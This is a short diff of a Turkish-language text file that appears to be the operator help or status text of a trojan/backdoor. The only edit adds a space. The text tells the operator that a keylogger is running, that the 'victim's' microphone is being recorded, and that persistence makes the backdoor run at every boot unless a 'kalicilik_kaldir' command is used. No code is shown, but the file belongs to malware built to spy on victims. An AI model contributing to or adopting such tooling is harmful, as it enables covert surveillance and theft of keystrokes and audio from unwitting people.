@@ -1,4 +1,4 @@
-	Keylogger şuan aktif.Keylogger ile ilgili komutlar için 'keylogger komutları' bölümüne bakabilirsiniz.
+	Keylogger şuan aktif.Keylogger ile ilgili komutlar için 'keylogger komutları' bölümüne bakabilirsiniz .
 	Kurbanın mikrofonu kaydediliyor(Eğer iptal etmediyseniz).Mikrofon ile ilgili komutlar için 'kamera ve ses komutları' bölümüne bakabilirsiniz.
 	Kalicilik kurban trojani actigindan beri aktif.(Eğer kalicilik_kaldir komutunu kullanmadiysaniz.)
 	Bu backdoor kurbanın bilgisayarı her kapatıp açtığında çalışacaktır.(Eğer bu özelliği istemiyorsanız,'kalicilik_kaldir' komutunu kullaniniz.)
